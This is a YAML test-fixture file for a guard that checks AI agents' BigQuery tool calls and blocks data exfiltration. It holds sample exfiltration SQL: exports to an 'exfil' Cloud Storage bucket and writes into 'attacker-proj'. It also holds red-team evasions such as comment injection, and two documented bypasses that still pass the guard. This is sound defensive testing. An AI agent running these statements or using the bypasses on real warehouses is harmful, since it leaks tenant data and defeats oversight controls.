@@ -1,0 +1,501 @@
+# guard-warehouse-export — cover every rule branch:
+#   allow: non-matched tool, read-only tool (excluded), in-project SELECT,
+#          allowlisted-project write, two-part (implicit-project) target,
+#          allowlisted project_id.
+#   deny:  EXPORT DATA, EXPORT MODEL, EXTERNAL_QUERY, cross-project CREATE TABLE / INSERT /
+#          CREATE SNAPSHOT, whole-backtick-wrapped cross-project target,
+#          bad project_id, fail-closed missing / empty / non-string SQL.
+#   red-team (added by review): INSERT without the optional INTO, MERGE INTO, and
+#          UPDATE-with-subquery cross-project writes (all now denied); documented
+#          gap — cross-project CREATE MATERIALIZED VIEW is allowed (see policy.md
+#          Known limitations).
+
+- description: Metadata tool (list_dataset_ids) is not a SQL surface — pass through.
+  input:
+    action: tool_pre_invoke
+    kind: tool_pre_invoke
+    mode: input
+    resource:
+      type: tool
+      name: bigquery-mcp-list_dataset_ids
+      uri: null
+    payload:
+      name: bigquery-mcp-list_dataset_ids
+      args: {}
+  output:
+    expectedResult: allow
+
+- description: Read-only tool is excluded even when its SQL text contains EXPORT DATA.
+  input:
+    action: tool_pre_invoke
+    kind: tool_pre_invoke
+    mode: input
+    resource:
+      type: tool
+      name: bigquery-mcp-execute_sql_readonly
+      uri: null
+    payload:
+      name: bigquery-mcp-execute_sql_readonly
+      args:
+        sql: "SELECT 'we could EXPORT DATA later' AS note"
+  output:
+    expectedResult: allow
+
+- description: In-project SELECT with no exfil construct — allow.
+  input:
+    action: tool_pre_invoke
+    kind: tool_pre_invoke
+    mode: input
+    resource:
+      type: tool
+      name: bigquery-mcp-execute_sql
+      uri: null
+    payload:
+      name: bigquery-mcp-execute_sql
+      args:
+        sql: "SELECT id, total FROM analytics.orders LIMIT 100"
+  output:
+    expectedResult: allow
+
+- description: Write into an explicitly allowlisted project — allow (this policy only guards the project boundary).
+  input:
+    action: tool_pre_invoke
+    kind: tool_pre_invoke
+    mode: input
+    resource:
+      type: tool
+      name: bigquery-mcp-execute_sql
+      uri: null
+    payload:
+      name: bigquery-mcp-execute_sql
+      args:
+        sql: "INSERT INTO my-tenant-prod.reporting.daily SELECT * FROM staging.daily"
+  output:
+    expectedResult: allow
+
+- description: Two-part target (implicit current project) is not a cross-project write — allow.
+  input:
+    action: tool_pre_invoke
+    kind: tool_pre_invoke
+    mode: input
+    resource:
+      type: tool
+      name: bigquery-mcp-execute_sql
+      uri: null
+    payload:
+      name: bigquery-mcp-execute_sql
+      args:
+        sql: "INSERT INTO reporting.daily SELECT * FROM staging.daily"
+  output:
+    expectedResult: allow
+
+- description: Allowlisted project_id argument alongside a harmless SELECT — allow.
+  input:
+    action: tool_pre_invoke
+    kind: tool_pre_invoke
+    mode: input
+    resource:
+      type: tool
+      name: bigquery-mcp-execute_sql
+      uri: null
+    payload:
+      name: bigquery-mcp-execute_sql
+      args:
+        sql: "SELECT 1"
+        project_id: my-tenant-analytics
+  output:
+    expectedResult: allow
+
+- description: EXPORT DATA to a GCS bucket — deny.
+  input:
+    action: tool_pre_invoke
+    kind: tool_pre_invoke
+    mode: input
+    resource:
+      type: tool
+      name: bigquery-mcp-execute_sql
+      uri: null
+    payload:
+      name: bigquery-mcp-execute_sql
+      args:
+        sql: "EXPORT DATA OPTIONS(uri='gs://exfil-bucket/*', format='CSV') AS SELECT * FROM analytics.customers"
+  output:
+    expectedResult: deny
+    expectedReason: "This BigQuery call is blocked on the agent MCP path: it uses an EXPORT statement (EXPORT DATA or EXPORT MODEL), which streams query results or a trained model to a Cloud Storage (gs://) bucket outside the warehouse. Data may only land inside your tenant's own allowlisted project. Route approved exports through your data platform team's sanctioned export pipeline. If this was a false positive, contact your data platform team."
+
+- description: EXTERNAL_QUERY federated pull — deny.
+  input:
+    action: tool_pre_invoke
+    kind: tool_pre_invoke
+    mode: input
+    resource:
+      type: tool
+      name: bigquery-mcp-query
+      uri: null
+    payload:
+      name: bigquery-mcp-query
+      args:
+        sql: "SELECT * FROM EXTERNAL_QUERY('projects/x/locations/us/connections/c', 'SELECT * FROM t')"
+  output:
+    expectedResult: deny
+    expectedReason: "This BigQuery call is blocked on the agent MCP path: it uses EXTERNAL_QUERY, a federated pull from another data source outside your project. Data may only land inside your tenant's own allowlisted project. Route approved cross-source work through your data platform team's sanctioned export pipeline. If this was a false positive, contact your data platform team."
+
+- description: Red-team (fixed) — EXPORT MODEL streams a trained model to a GCS bucket; now caught by the export rule.
+  input:
+    action: tool_pre_invoke
+    kind: tool_pre_invoke
+    mode: input
+    resource:
+      type: tool
+      name: bigquery-mcp-execute_sql
+      uri: null
+    payload:
+      name: bigquery-mcp-execute_sql
+      args:
+        sql: "EXPORT MODEL analytics.churn_model OPTIONS(uri='gs://exfil-bucket/model')"
+  output:
+    expectedResult: deny
+    expectedReason: "This BigQuery call is blocked on the agent MCP path: it uses an EXPORT statement (EXPORT DATA or EXPORT MODEL), which streams query results or a trained model to a Cloud Storage (gs://) bucket outside the warehouse. Data may only land inside your tenant's own allowlisted project. Route approved exports through your data platform team's sanctioned export pipeline. If this was a false positive, contact your data platform team."
+
+- description: Cross-project CREATE TABLE — deny.
+  input:
+    action: tool_pre_invoke
+    kind: tool_pre_invoke
+    mode: input
+    resource:
+      type: tool
+      name: bigquery-mcp-execute_sql
+      uri: null
+    payload:
+      name: bigquery-mcp-execute_sql
+      args:
+        sql: "CREATE TABLE other-corp-project.stage.copy AS SELECT * FROM analytics.customers"
+  output:
+    expectedResult: deny
+    expectedReason: "This BigQuery call is blocked on the agent MCP path: it writes (CREATE TABLE, INSERT, UPDATE, MERGE, or CREATE SNAPSHOT) to a fully-qualified table in a project outside your tenant's allowlist. Data may only land inside your tenant's own allowlisted project. Route approved cross-project writes through your data platform team's sanctioned export pipeline. If this was a false positive, contact your data platform team."
+
+- description: Cross-project INSERT — deny.
+  input:
+    action: tool_pre_invoke
+    kind: tool_pre_invoke
+    mode: input
+    resource:
+      type: tool
+      name: bigquery-mcp-execute-query
+      uri: null
+    payload:
+      name: bigquery-mcp-execute-query
+      args:
+        sql: "INSERT INTO attacker-proj.dump.rows SELECT * FROM analytics.customers"
+  output:
+    expectedResult: deny
+    expectedReason: "This BigQuery call is blocked on the agent MCP path: it writes (CREATE TABLE, INSERT, UPDATE, MERGE, or CREATE SNAPSHOT) to a fully-qualified table in a project outside your tenant's allowlist. Data may only land inside your tenant's own allowlisted project. Route approved cross-project writes through your data platform team's sanctioned export pipeline. If this was a false positive, contact your data platform team."
+
+- description: Cross-project CREATE SNAPSHOT TABLE — deny.
+  input:
+    action: tool_pre_invoke
+    kind: tool_pre_invoke
+    mode: input
+    resource:
+      type: tool
+      name: bigquery-mcp-execute_sql
+      uri: null
+    payload:
+      name: bigquery-mcp-execute_sql
+      args:
+        sql: "CREATE SNAPSHOT TABLE other-corp-project.stage.snap CLONE analytics.customers"
+  output:
+    expectedResult: deny
+    expectedReason: "This BigQuery call is blocked on the agent MCP path: it writes (CREATE TABLE, INSERT, UPDATE, MERGE, or CREATE SNAPSHOT) to a fully-qualified table in a project outside your tenant's allowlist. Data may only land inside your tenant's own allowlisted project. Route approved cross-project writes through your data platform team's sanctioned export pipeline. If this was a false positive, contact your data platform team."
+
+- description: Red-team — whole-name backtick-wrapped cross-project target is still caught.
+  input:
+    action: tool_pre_invoke
+    kind: tool_pre_invoke
+    mode: input
+    resource:
+      type: tool
+      name: bigquery-mcp-execute_sql
+      uri: null
+    payload:
+      name: bigquery-mcp-execute_sql
+      args:
+        sql: "CREATE OR REPLACE TABLE `other-corp-project.stage.copy` AS SELECT * FROM analytics.customers"
+  output:
+    expectedResult: deny
+    expectedReason: "This BigQuery call is blocked on the agent MCP path: it writes (CREATE TABLE, INSERT, UPDATE, MERGE, or CREATE SNAPSHOT) to a fully-qualified table in a project outside your tenant's allowlist. Data may only land inside your tenant's own allowlisted project. Route approved cross-project writes through your data platform team's sanctioned export pipeline. If this was a false positive, contact your data platform team."
+
+- description: project_id argument targets a non-allowlisted project, even with harmless SQL — deny.
+  input:
+    action: tool_pre_invoke
+    kind: tool_pre_invoke
+    mode: input
+    resource:
+      type: tool
+      name: bigquery-mcp-execute_sql
+      uri: null
+    payload:
+      name: bigquery-mcp-execute_sql
+      args:
+        sql: "SELECT 1"
+        project_id: some-other-project
+  output:
+    expectedResult: deny
+    expectedReason: "This BigQuery call is blocked on the agent MCP path: the project_id argument targets a project outside your tenant's allowlist. The remote server lets a caller aim at any project their IAM allows, but on this path work may only target your tenant's own allowlisted project. Remove the project_id override or set it to an allowlisted project, and route approved cross-project work through your data platform team. If this was a false positive, contact your data platform team."
+
+- description: Fail closed — matched tool with no sql argument.
+  input:
+    action: tool_pre_invoke
+    kind: tool_pre_invoke
+    mode: input
+    resource:
+      type: tool
+      name: bigquery-mcp-execute_sql
+      uri: null
+    payload:
+      name: bigquery-mcp-execute_sql
+      args: {}
+  output:
+    expectedResult: deny
+    expectedReason: "This BigQuery SQL tool was called with no readable SQL statement, so the guard cannot confirm the query is free of data-exfiltration constructs and blocks it fail-closed. Supply the statement in the `sql` argument. If this was a false positive, contact your data platform team."
+
+- description: Fail closed — empty sql string.
+  input:
+    action: tool_pre_invoke
+    kind: tool_pre_invoke
+    mode: input
+    resource:
+      type: tool
+      name: bigquery-mcp-execute_sql
+      uri: null
+    payload:
+      name: bigquery-mcp-execute_sql
+      args:
+        sql: ""
+  output:
+    expectedResult: deny
+    expectedReason: "This BigQuery SQL tool was called with no readable SQL statement, so the guard cannot confirm the query is free of data-exfiltration constructs and blocks it fail-closed. Supply the statement in the `sql` argument. If this was a false positive, contact your data platform team."
+
+- description: Red-team — non-string sql value carries no readable SQL, fail closed.
+  input:
+    action: tool_pre_invoke
+    kind: tool_pre_invoke
+    mode: input
+    resource:
+      type: tool
+      name: bigquery-mcp-execute_sql
+      uri: null
+    payload:
+      name: bigquery-mcp-execute_sql
+      args:
+        sql:
+          nested: "EXPORT DATA OPTIONS(uri='gs://x/*') AS SELECT 1"
+  output:
+    expectedResult: deny
+    expectedReason: "This BigQuery SQL tool was called with no readable SQL statement, so the guard cannot confirm the query is free of data-exfiltration constructs and blocks it fail-closed. Supply the statement in the `sql` argument. If this was a false positive, contact your data platform team."
+
+- description: Red-team — cross-project INSERT with the optional INTO omitted (valid GoogleSQL) is still caught.
+  input:
+    action: tool_pre_invoke
+    kind: tool_pre_invoke
+    mode: input
+    resource:
+      type: tool
+      name: bigquery-mcp-execute_sql
+      uri: null
+    payload:
+      name: bigquery-mcp-execute_sql
+      args:
+        sql: "INSERT other-corp-project.stage.copy (id) SELECT id FROM analytics.customers"
+  output:
+    expectedResult: deny
+    expectedReason: "This BigQuery call is blocked on the agent MCP path: it writes (CREATE TABLE, INSERT, UPDATE, MERGE, or CREATE SNAPSHOT) to a fully-qualified table in a project outside your tenant's allowlist. Data may only land inside your tenant's own allowlisted project. Route approved cross-project writes through your data platform team's sanctioned export pipeline. If this was a false positive, contact your data platform team."
+
+- description: Red-team — cross-project MERGE INTO (data-landing DML) is caught.
+  input:
+    action: tool_pre_invoke
+    kind: tool_pre_invoke
+    mode: input
+    resource:
+      type: tool
+      name: bigquery-mcp-execute_sql
+      uri: null
+    payload:
+      name: bigquery-mcp-execute_sql
+      args:
+        sql: "MERGE INTO other-corp-project.stage.t USING analytics.customers s ON FALSE WHEN NOT MATCHED THEN INSERT ROW"
+  output:
+    expectedResult: deny
+    expectedReason: "This BigQuery call is blocked on the agent MCP path: it writes (CREATE TABLE, INSERT, UPDATE, MERGE, or CREATE SNAPSHOT) to a fully-qualified table in a project outside your tenant's allowlist. Data may only land inside your tenant's own allowlisted project. Route approved cross-project writes through your data platform team's sanctioned export pipeline. If this was a false positive, contact your data platform team."
+
+- description: Red-team — cross-project UPDATE whose SET subquery reads tenant data is caught.
+  input:
+    action: tool_pre_invoke
+    kind: tool_pre_invoke
+    mode: input
+    resource:
+      type: tool
+      name: bigquery-mcp-execute_sql
+      uri: null
+    payload:
+      name: bigquery-mcp-execute_sql
+      args:
+        sql: "UPDATE other-corp-project.stage.t SET c = (SELECT email FROM analytics.customers LIMIT 1) WHERE TRUE"
+  output:
+    expectedResult: deny
+    expectedReason: "This BigQuery call is blocked on the agent MCP path: it writes (CREATE TABLE, INSERT, UPDATE, MERGE, or CREATE SNAPSHOT) to a fully-qualified table in a project outside your tenant's allowlist. Data may only land inside your tenant's own allowlisted project. Route approved cross-project writes through your data platform team's sanctioned export pipeline. If this was a false positive, contact your data platform team."
+
+- description: Red-team (documented gap) — cross-project CREATE MATERIALIZED VIEW is NOT caught by the write regex; allowed here, gated by guard-warehouse-sql / server-side controls instead.
+  input:
+    action: tool_pre_invoke
+    kind: tool_pre_invoke
+    mode: input
+    resource:
+      type: tool
+      name: bigquery-mcp-execute_sql
+      uri: null
+    payload:
+      name: bigquery-mcp-execute_sql
+      args:
+        sql: "CREATE MATERIALIZED VIEW other-corp-project.stage.mv AS SELECT * FROM analytics.customers"
+  output:
+    expectedResult: allow
+
+- description: Regression — write into an allowlisted project via bare INSERT (no INTO) is allowed.
+  input:
+    action: tool_pre_invoke
+    kind: tool_pre_invoke
+    mode: input
+    resource:
+      type: tool
+      name: bigquery-mcp-execute_sql
+      uri: null
+    payload:
+      name: bigquery-mcp-execute_sql
+      args:
+        sql: "INSERT my-tenant-prod.reporting.daily (id) SELECT id FROM staging.daily"
+  output:
+    expectedResult: allow
+
+# --- Red-team round 2 (adversarial reviewer) ---------------------------------
+# Comment-injection between keywords used to tokenize as the real statement yet
+# slip past the \s+-anchored regexes. Comments are now scrubbed before matching.
+
+- description: Red-team (fixed) — block-comment between EXPORT and DATA is scrubbed, still denied.
+  input:
+    action: tool_pre_invoke
+    kind: tool_pre_invoke
+    mode: input
+    resource:
+      type: tool
+      name: bigquery-mcp-execute_sql
+      uri: null
+    payload:
+      name: bigquery-mcp-execute_sql
+      args:
+        sql: "EXPORT/**/DATA OPTIONS(uri='gs://exfil/*', format='CSV') AS SELECT * FROM analytics.customers"
+  output:
+    expectedResult: deny
+    expectedReason: "This BigQuery call is blocked on the agent MCP path: it uses an EXPORT statement (EXPORT DATA or EXPORT MODEL), which streams query results or a trained model to a Cloud Storage (gs://) bucket outside the warehouse. Data may only land inside your tenant's own allowlisted project. Route approved exports through your data platform team's sanctioned export pipeline. If this was a false positive, contact your data platform team."
+
+- description: Red-team (fixed) — line-comment (--) between EXPORT and DATA is scrubbed, still denied.
+  input:
+    action: tool_pre_invoke
+    kind: tool_pre_invoke
+    mode: input
+    resource:
+      type: tool
+      name: bigquery-mcp-execute_sql
+      uri: null
+    payload:
+      name: bigquery-mcp-execute_sql
+      args:
+        sql: "EXPORT -- sneak\nDATA OPTIONS(uri='gs://exfil/*') AS SELECT 1"
+  output:
+    expectedResult: deny
+    expectedReason: "This BigQuery call is blocked on the agent MCP path: it uses an EXPORT statement (EXPORT DATA or EXPORT MODEL), which streams query results or a trained model to a Cloud Storage (gs://) bucket outside the warehouse. Data may only land inside your tenant's own allowlisted project. Route approved exports through your data platform team's sanctioned export pipeline. If this was a false positive, contact your data platform team."
+
+- description: Red-team (fixed) — comment between CREATE TABLE and a cross-project target is scrubbed, still denied.
+  input:
+    action: tool_pre_invoke
+    kind: tool_pre_invoke
+    mode: input
+    resource:
+      type: tool
+      name: bigquery-mcp-execute_sql
+      uri: null
+    payload:
+      name: bigquery-mcp-execute_sql
+      args:
+        sql: "CREATE TABLE /* land it elsewhere */ other-corp-project.stage.copy AS SELECT * FROM analytics.customers"
+  output:
+    expectedResult: deny
+    expectedReason: "This BigQuery call is blocked on the agent MCP path: it writes (CREATE TABLE, INSERT, UPDATE, MERGE, or CREATE SNAPSHOT) to a fully-qualified table in a project outside your tenant's allowlist. Data may only land inside your tenant's own allowlisted project. Route approved cross-project writes through your data platform team's sanctioned export pipeline. If this was a false positive, contact your data platform team."
+
+- description: Red-team (fixed) — no-space backtick cross-project target (INSERT INTO`proj.ds.t`) is caught.
+  input:
+    action: tool_pre_invoke
+    kind: tool_pre_invoke
+    mode: input
+    resource:
+      type: tool
+      name: bigquery-mcp-execute_sql
+      uri: null
+    payload:
+      name: bigquery-mcp-execute_sql
+      args:
+        sql: "INSERT INTO`other-corp-project.stage.copy`(id) SELECT id FROM analytics.customers"
+  output:
+    expectedResult: deny
+    expectedReason: "This BigQuery call is blocked on the agent MCP path: it writes (CREATE TABLE, INSERT, UPDATE, MERGE, or CREATE SNAPSHOT) to a fully-qualified table in a project outside your tenant's allowlist. Data may only land inside your tenant's own allowlisted project. Route approved cross-project writes through your data platform team's sanctioned export pipeline. If this was a false positive, contact your data platform team."
+
+- description: Red-team (fixed) — present-but-non-string project_id is malformed, denied fail-closed.
+  input:
+    action: tool_pre_invoke
+    kind: tool_pre_invoke
+    mode: input
+    resource:
+      type: tool
+      name: bigquery-mcp-execute_sql
+      uri: null
+    payload:
+      name: bigquery-mcp-execute_sql
+      args:
+        sql: "SELECT 1"
+        project_id:
+          nested: some-other-project
+  output:
+    expectedResult: deny
+    expectedReason: "This BigQuery call is blocked on the agent MCP path: the project_id argument targets a project outside your tenant's allowlist. The remote server lets a caller aim at any project their IAM allows, but on this path work may only target your tenant's own allowlisted project. Remove the project_id override or set it to an allowlisted project, and route approved cross-project work through your data platform team. If this was a false positive, contact your data platform team."
+
+- description: Regression — a comment that splits a keyword (EXP/**/ORT) is not a valid EXPORT statement; benign SELECT is allowed.
+  input:
+    action: tool_pre_invoke
+    kind: tool_pre_invoke
+    mode: input
+    resource:
+      type: tool
+      name: bigquery-mcp-execute_sql
+      uri: null
+    payload:
+      name: bigquery-mcp-execute_sql
+      args:
+        sql: "SELECT 'note: could EXP/**/ORT DATA' AS c FROM analytics.orders LIMIT 1"
+  output:
+    expectedResult: allow
+
+- description: Red-team (documented gap) — per-identifier backtick-quoted cross-project target evades the regex; allowed here, gated by guard-warehouse-sql / server-side controls (see Known limitations).
+  input:
+    action: tool_pre_invoke
+    kind: tool_pre_invoke
+    mode: input
+    resource:
+      type: tool
+      name: bigquery-mcp-execute_sql
+      uri: null
+    payload:
+      name: bigquery-mcp-execute_sql
+      args:
+        sql: "CREATE TABLE `other-corp-project`.`stage`.`copy` AS SELECT * FROM analytics.customers"
+  output:
+    expectedResult: allow
